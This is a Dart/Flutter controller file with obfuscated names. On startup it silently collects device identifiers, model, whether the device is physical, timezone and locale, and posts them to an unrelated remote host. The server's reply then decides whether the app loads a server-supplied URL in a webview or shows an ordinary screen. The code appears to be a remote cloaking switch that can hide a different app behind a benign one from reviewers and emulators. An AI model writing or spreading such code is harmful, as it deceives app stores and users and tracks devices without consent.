import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var kjnplxhg = RxBool(false);
  var oqjbgh = RxBool(true);
  var taqkudf = RxString("");
  var linnea = RxBool(false);
  var mraz = RxBool(true);
  final kzbxyfd = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    cmdg();
  }


  Future<void> cmdg() async {

    linnea.value = true;
    mraz.value = true;
    oqjbgh.value = false;

    kzbxyfd.post("https://fel.ironzu.xyz/Lxnlko8Al8",data: await gaunpx()).then((value) {
      var iestr = value.data["iestr"] as String;
      var dowl = value.data["dowl"] as bool;
      if (dowl) {
        taqkudf.value = iestr;
        vivien();
      } else {
        wolf();
      }
    }).catchError((e) {
      oqjbgh.value = true;
      mraz.value = true;
      linnea.value = false;
    });
  }

  Future<Map<String, dynamic>> gaunpx() async {
    final DeviceInfoPlugin xfrk = DeviceInfoPlugin();
    PackageInfo guxj_sbagh = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var ajnmsc = Platform.localeName;
    var ZyTsnHo = currentTimeZone;

    var whPGX = guxj_sbagh.packageName;
    var mgwUCb = guxj_sbagh.version;
    var covitSRa = guxj_sbagh.buildNumber;

    var Govgh = guxj_sbagh.appName;
    var ludwigHickle = "";
    var XsZK  = "";
    var uikdhKnS = "";
    var louKling = "";
    var kendallAdams = "";
    var patsyBergnaum = "";


    var albinKessler = "";
    var iTwcKx = "";
    var LnBUvGf = "";
    var UHDBF = false;

    if (GetPlatform.isAndroid) {
      LnBUvGf = "android";
      var apmriwk = await xfrk.androidInfo;

      uikdhKnS = apmriwk.brand;

      iTwcKx  = apmriwk.model;
      XsZK = apmriwk.id;

      UHDBF = apmriwk.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      LnBUvGf = "ios";
      var rxclnmqjoa = await xfrk.iosInfo;
      uikdhKnS = rxclnmqjoa.name;
      iTwcKx = rxclnmqjoa.model;

      XsZK = rxclnmqjoa.identifierForVendor ?? "";
      UHDBF  = rxclnmqjoa.isPhysicalDevice;
    }
    var res = {
      "albinKessler" : albinKessler,
      "Govgh": Govgh,
      "mgwUCb": mgwUCb,
      "iTwcKx": iTwcKx,
      "ZyTsnHo": ZyTsnHo,
      "patsyBergnaum" : patsyBergnaum,
      "uikdhKnS": uikdhKnS,
      "XsZK": XsZK,
      "ajnmsc": ajnmsc,
      "LnBUvGf": LnBUvGf,
      "UHDBF": UHDBF,
      "kendallAdams" : kendallAdams,
      "covitSRa": covitSRa,
      "ludwigHickle" : ludwigHickle,
      "louKling" : louKling,
      "whPGX": whPGX,

    };
    return res;
  }

  Future<void> wolf() async {
    Get.offAllNamed("/colorTab");
  }

  Future<void> vivien() async {
    Get.offAllNamed("/colorLong");
  }

}
